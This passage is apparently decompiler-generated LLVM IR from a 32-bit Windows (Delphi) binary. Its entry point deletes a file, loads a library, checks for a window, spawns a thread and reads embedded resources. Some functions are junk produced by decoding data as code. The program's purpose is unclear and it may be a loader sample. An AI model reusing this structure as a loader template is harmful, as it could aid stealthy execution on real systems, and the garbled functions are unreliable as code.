  %75 = load i32, i32* %74, align 4, !insn.addr !1989
  %76 = icmp eq i32 %75, 0, !insn.addr !1990
  %77 = icmp eq i1 %76, false, !insn.addr !1991
  store i32 %75, i32* %.reg2mem14, !insn.addr !1991
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !1991
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !1991
  br i1 %77, label %dec_label_pc_40773e, label %dec_label_pc_407787, !insn.addr !1991

dec_label_pc_407787:                              ; preds = %dec_label_pc_40777e, %dec_label_pc_407736, %dec_label_pc_407743, %dec_label_pc_407723
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !2014
  %79 = add i32 %esi.08.reload, 32, !insn.addr !1977
  %80 = inttoptr i32 %79 to i32*, !insn.addr !1977
  %81 = load i32, i32* %80, align 4, !insn.addr !1977
  %82 = icmp eq i32 %81, 0, !insn.addr !1978
  %83 = icmp eq i1 %82, false, !insn.addr !1979
  store i32 %81, i32* %.reg2mem, !insn.addr !1979
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !1979
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !1979
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !1979
  br i1 %83, label %dec_label_pc_407723, label %dec_label_pc_407791, !insn.addr !1979

dec_label_pc_407791:                              ; preds = %dec_label_pc_407787, %dec_label_pc_40778a.preheader, %dec_label_pc_40770a, %dec_label_pc_4076e4
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2015
}

define i32 @function_40779c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40779c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !2016
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2016
  %3 = load i32, i32* %2, align 4, !insn.addr !2016
  ret i32 %3, !insn.addr !2017
}

define i32 @function_4077a0() local_unnamed_addr {
dec_label_pc_4077a0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2018
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2018
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2018
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2019
  %2 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2020
  %3 = add i32 %2, 1, !insn.addr !2020
  store i32 %3, i32* @global_var_4096f4, align 4, !insn.addr !2020
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2021
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2022
  ret i32 0, !insn.addr !2023
}

define i32 @function_4077c5() local_unnamed_addr {
dec_label_pc_4077c5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2024
  ret i32 %0, !insn.addr !2024
}

define i32 @function_4077ca() local_unnamed_addr {
dec_label_pc_4077ca:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2025
}

define i32 @function_4077cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4077cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2026
}

define i32 @function_4077d0() local_unnamed_addr {
dec_label_pc_4077d0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2027
  %2 = add i32 %1, -1, !insn.addr !2027
  store i32 %2, i32* @global_var_4096f4, align 4, !insn.addr !2027
  ret i32 %0, !insn.addr !2028
}

define i32 @function_4077d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4077d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_40779c(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !2029
  ret i32 %3, !insn.addr !2030
}

define i32 @function_407824(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407824:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !2031
  %2 = icmp eq i1 %1, false, !insn.addr !2032
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_40779c(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !2033
  ret i32 %3, !insn.addr !2034
}

define i32 @function_407854(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407854:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2035
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2035
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2035
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2036
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2037
  %3 = call i32 @"@LStrPos"(), !insn.addr !2038
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_40792c to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2039
  %6 = call i32 @"@LStrPos"(), !insn.addr !2040
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_40792c to i32)
  %8 = call i32 @function_40779c(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2041
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2042
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2043
  ret i32 %9, !insn.addr !2044
}

define i32 @function_4078ec() local_unnamed_addr {
dec_label_pc_4078ec:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2045
  ret i32 %0, !insn.addr !2045
}

define i32 @function_4078f1() local_unnamed_addr {
dec_label_pc_4078f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2046
}

define i32 @function_4078f3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4078f3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2047
}

define i32 @function_407903() local_unnamed_addr {
dec_label_pc_407903:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2048
}

define i32 @function_407950() local_unnamed_addr {
dec_label_pc_407950:
  %0 = call i32 @function_407610(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_4079c0, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_4079cc, i32 0, i32 0), i32 4224984), !insn.addr !2049
  store i32 %0, i32* @global_var_408110, align 4, !insn.addr !2050
  %1 = call i32 @function_407610(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_4079c0, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4079e8, i32 0, i32 0), i32 4225060), !insn.addr !2051
  store i32 %1, i32* @global_var_408114, align 4, !insn.addr !2052
  %2 = call i32 @function_407610(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a00, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_407a0c, i32 0, i32 0), i32 4225108), !insn.addr !2053
  store i32 %2, i32* @global_var_408118, align 4, !insn.addr !2054
  ret i32 %2, !insn.addr !2055
}

define i32 @function_4079c0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14, i32 %arg15) local_unnamed_addr {
dec_label_pc_4079c0:
  %merge.reg2mem = alloca i32, !insn.addr !2056
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !2056
  br i1 %10, label %dec_label_pc_4079ef, label %dec_label_pc_4079c2, !insn.addr !2056

dec_label_pc_4079c2:                              ; preds = %dec_label_pc_4079c0
  br i1 %8, label %dec_label_pc_4079f8, label %dec_label_pc_4079c5, !insn.addr !2057

dec_label_pc_4079c5:                              ; preds = %dec_label_pc_4079c2
  %11 = trunc i32 %4 to i16, !insn.addr !2058
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !2058
  %13 = inttoptr i32 %0 to i8*, !insn.addr !2058
  store i8 %12, i8* %13, align 1, !insn.addr !2058
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !2059
  store i8 %14, i8* %13, align 1, !insn.addr !2059
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2060
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !2060
  %19 = add i8 %16, %18, !insn.addr !2060
  %20 = inttoptr i32 %17 to i8*, !insn.addr !2060
  store i8 %19, i8* %20, align 1, !insn.addr !2060
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !2061
  %21 = trunc i32 %arg10 to i16, !insn.addr !2062
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !2062
  %23 = inttoptr i32 %9 to i32*, !insn.addr !2062
  store i32 %22, i32* %23, align 4, !insn.addr !2062
  store i32 %arg1, i32* %eax, align 4, !insn.addr !2063
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !2064
  %25 = load i8, i8* %24, align 1, !insn.addr !2064
  %26 = trunc i32 %arg1 to i8, !insn.addr !2064
  %27 = add i8 %25, %26, !insn.addr !2064
  store i8 %27, i8* %24, align 1, !insn.addr !2064
  %28 = trunc i32 %arg3 to i16, !insn.addr !2065
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !2065
  %30 = load i32, i32* %29, align 4, !insn.addr !2065
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !2065
  %31 = add i32 %arg5, 67, !insn.addr !2066
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2066
  %34 = load i32, i32* %33, align 4, !insn.addr !2066
  %35 = load i8, i8* %24, align 1, !insn.addr !2067
  %36 = add i8 %35, %26, !insn.addr !2067
  store i8 %36, i8* %24, align 1, !insn.addr !2067
  %37 = mul i32 %34, 1557718248, !insn.addr !2068
  %38 = add i32 %arg7, 97, !insn.addr !2068
  %39 = add i32 %38, %37, !insn.addr !2068
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2068
  %41 = load i8, i8* %40, align 1, !insn.addr !2068
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !2068
  %44 = add i8 %43, %41, !insn.addr !2068
  %45 = icmp eq i8 %44, 0, !insn.addr !2068
  store i8 %44, i8* %40, align 1, !insn.addr !2068
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !2069
  br i1 %45, label %dec_label_pc_407a61, label %dec_label_pc_4079ef, !insn.addr !2069

dec_label_pc_4079ef:                              ; preds = %dec_label_pc_4079c0, %dec_label_pc_4079c5
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2070

dec_label_pc_4079f8:                              ; preds = %dec_label_pc_4079c2
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !2071
  %49 = inttoptr i32 %6 to i8*, !insn.addr !2071
  store i8 %48, i8* %49, align 1, !insn.addr !2071
  %50 = add i32 %3, 104, !insn.addr !2072
  %51 = inttoptr i32 %50 to i8*, !insn.addr !2072
  %52 = load i8, i8* %51, align 1, !insn.addr !2072
  %53 = udiv i32 %4, 256, !insn.addr !2072
  %54 = trunc i32 %53 to i8, !insn.addr !2072
  %55 = add i8 %52, %54, !insn.addr !2072
  store i8 %55, i8* %51, align 1, !insn.addr !2072
  %56 = trunc i32 %4 to i16, !insn.addr !2073
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !2073
  %58 = inttoptr i32 %0 to i8*, !insn.addr !2073
  store i8 %57, i8* %58, align 1, !insn.addr !2073
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !2074
  store i8 %59, i8* %58, align 1, !insn.addr !2074
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !2075
  store i8 %60, i8* %58, align 1, !insn.addr !2075
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !2076
  store i8 %61, i8* %58, align 1, !insn.addr !2076
  %62 = load i8, i8* %51, align 1, !insn.addr !2077
  %63 = trunc i32 %4 to i8, !insn.addr !2077
  %64 = add i8 %62, %63, !insn.addr !2077
  store i8 %64, i8* %51, align 1, !insn.addr !2077
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !2078
  store i8 %65, i8* %58, align 1, !insn.addr !2078
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !2079
  store i8 %66, i8* %58, align 1, !insn.addr !2079
  %67 = add i32 %2, 1, !insn.addr !2080
  %68 = icmp slt i32 %67, 0, !insn.addr !2080
  br i1 %68, label %dec_label_pc_407a79, label %dec_label_pc_407a14, !insn.addr !2081

dec_label_pc_407a14:                              ; preds = %dec_label_pc_4079f8
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !2082
  %72 = xor i32 %4, %1, !insn.addr !2083
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !2084
  %75 = inttoptr i32 %74 to i16*, !insn.addr !2084
  %76 = load i16, i16* %75, align 2, !insn.addr !2084
  %77 = trunc i32 %72 to i16, !insn.addr !2084
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !2084
  %78 = load i8, i8* %73, align 4, !insn.addr !2085
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !2085
  %81 = add i8 %78, %80, !insn.addr !2085
  %82 = inttoptr i32 %79 to i8*, !insn.addr !2085
  store i8 %81, i8* %82, align 1, !insn.addr !2085
  %83 = add i32 %71, 82, !insn.addr !2086
  %84 = inttoptr i32 %83 to i8*, !insn.addr !2086
  %85 = load i8, i8* %84, align 1, !insn.addr !2086
  %86 = add i8 %85, %63, !insn.addr !2086
  store i8 %86, i8* %84, align 1, !insn.addr !2086
  %87 = load i32, i32* %eax, align 4, !insn.addr !2087
  %88 = add i32 %87, -1, !insn.addr !2087
  %89 = add i32 %71, 4227345, !insn.addr !2088
  %90 = inttoptr i32 %89 to i8*, !insn.addr !2088
  %91 = load i8, i8* %90, align 1, !insn.addr !2088
  %92 = udiv i32 %88, 256, !insn.addr !2088
  %93 = trunc i32 %92 to i8, !insn.addr !2088
  %94 = add i8 %91, %93, !insn.addr !2088
  store i8 %94, i8* %90, align 1, !insn.addr !2088
  ret i32 %88, !insn.addr !2088

dec_label_pc_407a61:                              ; preds = %dec_label_pc_4079c5
  %95 = add i32 %46, 1, !insn.addr !2089
  store i32 %95, i32* %eax, align 4, !insn.addr !2089
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !2090
  %97 = load i8, i8* %96, align 1, !insn.addr !2090
  %98 = udiv i32 %arg3, 256, !insn.addr !2090
  %99 = trunc i32 %98 to i8, !insn.addr !2090
  %100 = add i8 %97, %99, !insn.addr !2090
  store i8 %100, i8* %96, align 1, !insn.addr !2090
  %101 = add i32 %arg3, 89, !insn.addr !2091
  %102 = inttoptr i32 %101 to i8*, !insn.addr !2091
  store i8 -1, i8* %102, align 1, !insn.addr !2091
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !2092
  %103 = load i32, i32* %eax, align 4, !insn.addr !2093
  ret i32 %103, !insn.addr !2093

dec_label_pc_407a79:                              ; preds = %dec_label_pc_4079f8
  %104 = load i32, i32* %eax, align 4, !insn.addr !2094
  ret i32 %104, !insn.addr !2094
}

define i32 @function_407a7c() local_unnamed_addr {
dec_label_pc_407a7c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f8, align 4, !insn.addr !2095
  %2 = add i32 %1, -1, !insn.addr !2095
  store i32 %2, i32* @global_var_4096f8, align 4, !insn.addr !2095
  ret i32 %0, !insn.addr !2096
}

define i32 @function_407a84() local_unnamed_addr {
dec_label_pc_407a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2097
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407aaf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2098
  ret i32 %0, !insn.addr !2098
}

define i32 @function_407ab4() local_unnamed_addr {
dec_label_pc_407ab4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2099
}

define i32 @function_407ab6(i32 %arg1) local_unnamed_addr {
dec_label_pc_407ab6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2100
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407bb8:
  %esp.2.reg2mem = alloca i32, !insn.addr !2101
  %esp.1.reg2mem = alloca i32, !insn.addr !2101
  %esp.0.reg2mem = alloca i32, !insn.addr !2101
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2102
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2103
  store i32 %2, i32* %stack_var_-112, align 4, !insn.addr !2103
  %3 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !2103
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2104
  store i32 0, i32* %stack_var_-124, align 4, !insn.addr !2105
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096fc to i8*), i32 0), !insn.addr !2106
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096fc to i32), !insn.addr !2107
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2107
  store i8 0, i8* %6, align 1, !insn.addr !2107
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2108
  %8 = call i32 @function_40703c(), !insn.addr !2109
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2110
  %10 = call i32 @function_4070b4(), !insn.addr !2111
  %11 = trunc i32 %10 to i8, !insn.addr !2112
  %12 = icmp eq i8 %11, 0, !insn.addr !2112
  br i1 %12, label %dec_label_pc_407cbc, label %dec_label_pc_407c41, !insn.addr !2113

dec_label_pc_407c41:                              ; preds = %dec_label_pc_407bb8
  %13 = load i32, i32* @global_var_408130, align 4, !insn.addr !2114
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2115
  store i32 -1, i32* %14, align 4, !insn.addr !2115
  %15 = call i32 @"@LStrFromArray"(), !insn.addr !2116
  %16 = call i32 @function_40707c(), !insn.addr !2117
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2118
  %18 = call i32 @"@LStrCat3"(), !insn.addr !2119
  %19 = call i32 @function_4036c8(), !insn.addr !2120
  %20 = inttoptr i32 %19 to i8*, !insn.addr !2121
  %21 = call i1 @DeleteFileA(i8* %20), !insn.addr !2122
  %22 = call i32 @"@LStrCat3"(), !insn.addr !2123
  %23 = call i32 @function_4036c8(), !insn.addr !2124
  %24 = inttoptr i32 %23 to i8*, !insn.addr !2125
  store i8* %24, i8** %stack_var_-132, align 4, !insn.addr !2125
  %25 = ptrtoint i8** %stack_var_-132 to i32, !insn.addr !2125
  %26 = call i32* @LoadLibraryA(i8* %24), !insn.addr !2126
  %27 = ptrtoint i32* %26 to i32, !insn.addr !2126
  store i32 %27, i32* @global_var_40811c, align 4, !insn.addr !2127
  store i32 %25, i32* %esp.0.reg2mem, !insn.addr !2128
  br label %dec_label_pc_407cde, !insn.addr !2128

dec_label_pc_407cbc:                              ; preds = %dec_label_pc_407bb8
  %28 = ptrtoint i32* %stack_var_-124 to i32, !insn.addr !2105
  %29 = call i32 @function_4070b4(), !insn.addr !2129
  %30 = trunc i32 %29 to i8, !insn.addr !2130
  %31 = icmp eq i8 %30, 0, !insn.addr !2130
  store i32 %28, i32* %esp.2.reg2mem, !insn.addr !2131
  br i1 %31, label %dec_label_pc_407e20, label %dec_label_pc_407cd3, !insn.addr !2131

dec_label_pc_407cd3:                              ; preds = %dec_label_pc_407cbc
  %32 = load i32*, i32** @global_var_40813c, align 4, !insn.addr !2132
  store i32 -1, i32* %32, align 4, !insn.addr !2133
  store i32 %28, i32* %esp.0.reg2mem, !insn.addr !2133
  br label %dec_label_pc_407cde, !insn.addr !2133

dec_label_pc_407cde:                              ; preds = %dec_label_pc_407cd3, %dec_label_pc_407c41
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %33 = add i32 %esp.0.reload, -4, !insn.addr !2134
  %34 = inttoptr i32 %33 to i32*, !insn.addr !2134
  store i32 260, i32* %34, align 4, !insn.addr !2134
  %35 = add i32 %esp.0.reload, -8, !insn.addr !2135
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2135
  store i32 ptrtoint (i8** @global_var_4096fc to i32), i32* %36, align 4, !insn.addr !2135
  %37 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2136
  %38 = ptrtoint i32 (i32, i32, i32)* %37 to i32, !insn.addr !2136
  %39 = add i32 %esp.0.reload, -12, !insn.addr !2137
  %40 = inttoptr i32 %39 to i32*, !insn.addr !2137
  store i32 %38, i32* %40, align 4, !insn.addr !2137
  %41 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2138
  %42 = add i32 %41, ptrtoint (i8** @global_var_4096fc to i32), !insn.addr !2139
  %43 = inttoptr i32 %42 to i8*, !insn.addr !2139
  store i8 0, i8* %43, align 1, !insn.addr !2139
  %44 = call i32 @"@LStrFromArray"(), !insn.addr !2140
  %45 = call i32 @function_40707c(), !insn.addr !2141
  %46 = call i32 @"@LStrAsg"(), !insn.addr !2142
  %47 = call i32 @"@LStrCat3"(), !insn.addr !2143
  %48 = load i32*, i32** @global_var_40813c, align 4, !insn.addr !2144
  %49 = icmp eq i32* %48, null, !insn.addr !2144
  br i1 %49, label %dec_label_pc_407d77, label %dec_label_pc_407d44, !insn.addr !2145

dec_label_pc_407d44:                              ; preds = %dec_label_pc_407cde
  %50 = add i32 %esp.0.reload, -16, !insn.addr !2146
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2146
  store i32 ptrtoint ([16 x i8]* @global_var_407ea0 to i32), i32* %51, align 4, !insn.addr !2146
  %52 = add i32 %esp.0.reload, -20, !insn.addr !2147
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2147
  store i32 ptrtoint ([8 x i8]* @global_var_407eb0 to i32), i32* %53, align 4, !insn.addr !2147
  %54 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2148
  %55 = icmp eq i32* %54, null, !insn.addr !2149
  %56 = icmp eq i1 %55, false, !insn.addr !2150
  store i32 %52, i32* %esp.2.reg2mem, !insn.addr !2150
  br i1 %56, label %dec_label_pc_407e20, label %dec_label_pc_407d5b, !insn.addr !2150

dec_label_pc_407d5b:                              ; preds = %dec_label_pc_407d44
  %57 = add i32 %esp.0.reload, -24, !insn.addr !2151
  %58 = inttoptr i32 %57 to i32*, !insn.addr !2151
  store i32 ptrtoint (i32* @global_var_40980c to i32), i32* %58, align 4, !insn.addr !2151
  %59 = add i32 %esp.0.reload, -28, !insn.addr !2152
  %60 = inttoptr i32 %59 to i32*, !insn.addr !2152
  store i32 0, i32* %60, align 4, !insn.addr !2152
  %61 = add i32 %esp.0.reload, -32, !insn.addr !2153
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2153
  store i32 66, i32* %62, align 4, !insn.addr !2153
  %63 = add i32 %esp.0.reload, -36, !insn.addr !2154
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2154
  store i32 4220064, i32* %64, align 4, !insn.addr !2154
  %65 = add i32 %esp.0.reload, -40, !insn.addr !2155
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2155
  store i32 0, i32* %66, align 4, !insn.addr !2155
  %67 = add i32 %esp.0.reload, -44, !insn.addr !2156
  %68 = inttoptr i32 %67 to i32*, !insn.addr !2156
  store i32 0, i32* %68, align 4, !insn.addr !2156
  %69 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2157
  store i32 %67, i32* %esp.2.reg2mem, !insn.addr !2158
  br label %dec_label_pc_407e20, !insn.addr !2158

dec_label_pc_407d77:                              ; preds = %dec_label_pc_407cde
  %70 = load i32, i32* @global_var_408130, align 4, !insn.addr !2159
  %71 = icmp eq i32 %70, 0, !insn.addr !2159
  store i32 %39, i32* %esp.2.reg2mem, !insn.addr !2160
  br i1 %71, label %dec_label_pc_407e20, label %dec_label_pc_407d85, !insn.addr !2160

dec_label_pc_407d85:                              ; preds = %dec_label_pc_407d77
  %72 = load i8, i8* bitcast (i32** @global_var_408168 to i8*), align 4, !insn.addr !2161
  %73 = icmp eq i8 %72, 0, !insn.addr !2161
  br i1 %73, label %dec_label_pc_407d94, label %dec_label_pc_407d8f, !insn.addr !2162

dec_label_pc_407d8f:                              ; preds = %dec_label_pc_407d85
  %74 = call i32 @function_4068dc(), !insn.addr !2163
  br label %dec_label_pc_407d94, !insn.addr !2163

dec_label_pc_407d94:                              ; preds = %dec_label_pc_407d8f, %dec_label_pc_407d85
  %75 = load i32, i32* @global_var_40814c, align 4, !insn.addr !2164
  %76 = icmp slt i32 %75, 1, !insn.addr !2165
  br i1 %76, label %dec_label_pc_407dd1, label %dec_label_pc_407d9e, !insn.addr !2165

dec_label_pc_407d9e:                              ; preds = %dec_label_pc_407d94
  %77 = call i32 @function_40660c(), !insn.addr !2166
  %78 = call i32 @"@LStrCmp"(), !insn.addr !2167
  %79 = load i32*, i32** @global_var_408158, align 4, !insn.addr !2168
  store i32 -1, i32* %79, align 4, !insn.addr !2169
  %80 = load i32*, i32** @global_var_408158, align 4, !insn.addr !2170
  %81 = icmp eq i32* %80, null, !insn.addr !2170
  br i1 %81, label %dec_label_pc_407dd1, label %dec_label_pc_407dcc, !insn.addr !2171

dec_label_pc_407dcc:                              ; preds = %dec_label_pc_407d9e
  %82 = call i32 @function_4063c4(), !insn.addr !2172
  br label %dec_label_pc_407dd1, !insn.addr !2172

dec_label_pc_407dd1:                              ; preds = %dec_label_pc_407dcc, %dec_label_pc_407d9e, %dec_label_pc_407d94
  %83 = add i32 %esp.0.reload, -16, !insn.addr !2173
  %84 = inttoptr i32 %83 to i32*, !insn.addr !2173
  store i32 3, i32* %84, align 4, !insn.addr !2173
  %85 = add i32 %esp.0.reload, -20, !insn.addr !2174
  %86 = inttoptr i32 %85 to i32*, !insn.addr !2174
  store i32 16065, i32* %86, align 4, !insn.addr !2174
  %87 = load i32, i32* @global_var_40811c, align 4, !insn.addr !2175
  %88 = add i32 %esp.0.reload, -24, !insn.addr !2176
  %89 = inttoptr i32 %88 to i32*, !insn.addr !2176
  store i32 %87, i32* %89, align 4, !insn.addr !2176
  %90 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2177
  %91 = icmp eq i32* %90, null, !insn.addr !2178
  %92 = icmp eq i1 %91, false, !insn.addr !2179
  store i32 %88, i32* %esp.1.reg2mem, !insn.addr !2179
  br i1 %92, label %dec_label_pc_407e11, label %dec_label_pc_407de7, !insn.addr !2179

dec_label_pc_407de7:                              ; preds = %dec_label_pc_407dd1
  %93 = add i32 %esp.0.reload, -28, !insn.addr !2180
  %94 = inttoptr i32 %93 to i32*, !insn.addr !2180
  store i32 14, i32* %94, align 4, !insn.addr !2180
  %95 = add i32 %esp.0.reload, -32, !insn.addr !2181
  %96 = inttoptr i32 %95 to i32*, !insn.addr !2181
  store i32 16065, i32* %96, align 4, !insn.addr !2181
  %97 = load i32, i32* @global_var_40811c, align 4, !insn.addr !2182
  %98 = add i32 %esp.0.reload, -36, !insn.addr !2183
  %99 = inttoptr i32 %98 to i32*, !insn.addr !2183
  store i32 %97, i32* %99, align 4, !insn.addr !2183
  %100 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2184
  %101 = icmp eq i32* %100, null, !insn.addr !2185
  %102 = icmp eq i1 %101, false, !insn.addr !2186
  store i32 %98, i32* %esp.1.reg2mem, !insn.addr !2186
  br i1 %102, label %dec_label_pc_407e11, label %dec_label_pc_407dfd, !insn.addr !2186

dec_label_pc_407dfd:                              ; preds = %dec_label_pc_407de7
